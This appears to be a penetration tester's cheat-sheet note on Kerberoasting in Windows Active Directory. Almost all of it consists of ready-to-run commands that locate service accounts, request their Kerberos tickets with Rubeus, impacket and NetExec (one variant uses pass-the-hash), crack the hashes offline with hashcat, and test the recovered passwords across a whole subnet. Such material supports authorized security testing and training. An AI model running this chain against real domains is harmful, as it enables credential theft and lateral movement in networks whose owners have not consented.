---
tags:
  - Foundational
  - Privilege_Escalation
  - Windows
---

## Kerberoasting
resources: [HackTricks Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)

> [!info] Request TGS tickets for service accounts (accounts with SPNs) and crack offline. Any domain user can request these tickets.

### Find Kerberoastable Accounts
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object SamAccountName,ServicePrincipalName
```

```powershell
.\Rubeus.exe kerberoast /stats
```

### [Alternate] Find with Hackles (BloodHound)
```bash
python -m hackles -u neo4j -p '<Neo4jPassword>' --kerberoastable
```

### Kerberoast with Rubeus [Remote]
```powershell
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
```

```powershell
# Target specific user
.\Rubeus.exe kerberoast /user:<ServiceAccount> /outfile:kerberoast_hashes.txt
```

```powershell
# Request RC4 (easier to crack but more detectable)
.\Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt
```

### Kerberoast from Kali [Local]
```bash
impacket-GetUserSPNs <Domain>/<Username>:<Password> -dc-ip <DC_IP> -request -outputfile kerberoast.txt
```

```bash
# Pass the hash
impacket-GetUserSPNs -hashes :<NTLMHash> <Domain>/<Username> -dc-ip <DC_IP> -request -outputfile kerberoast.txt
```

### [Alternate] Kerberoast with NetExec
```bash
nxc ldap <DC_IP> -u <Username> -p '<Password>' --kerberoasting kerberoast.txt
```

### Crack Hashes - RC4 [Local]
```bash
hashcat -m 13100 kerberoast.txt rockyou.txt -r /opt/hashcat/rules/best64.rule
```

### [Alternate] Crack Hashes - AES-256
```bash
hashcat -m 19700 kerberoast.txt rockyou.txt -r /opt/hashcat/rules/best64.rule
```

### Validate Cracked Credentials [Local]
```bash
nxc smb <DC_IP> -u <ServiceAccount> -p '<CrackedPassword>' -d <Domain>
```

```bash
# Check for admin access across subnet
nxc smb 192.168.1.0/24 -u <ServiceAccount> -p '<CrackedPassword>' -d <Domain>
```
